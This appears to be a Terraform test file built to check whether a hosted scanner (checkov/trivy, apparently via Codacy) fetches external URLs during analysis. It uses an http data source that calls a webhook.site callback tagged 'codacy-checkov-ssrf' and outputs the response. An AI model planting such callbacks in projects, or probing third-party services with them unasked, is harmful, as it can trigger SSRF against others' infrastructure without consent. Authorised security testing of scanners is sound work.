terraform {
  required_version = ">= 0.12"

  required_providers {
    test = {
      source  = "registry.terraform.io/hashicorp/random"
      version = "~> 3.0"
    }
  }
}

# Test if checkpoint/trivy/checkov resolves external URLs during analysis
data "http" "external_callback" {
  url = "https://webhook.site/e5b582af-85d3-45c7-87a1-4adee0b98905/checkov-test"
  request_headers = {
    "X-Test" = "codacy-checkov-ssrf"
  }
}

resource "random_pet" "test" {
  length = 2
}

output "test_output" {
  value = data.http.external_callback.body
}
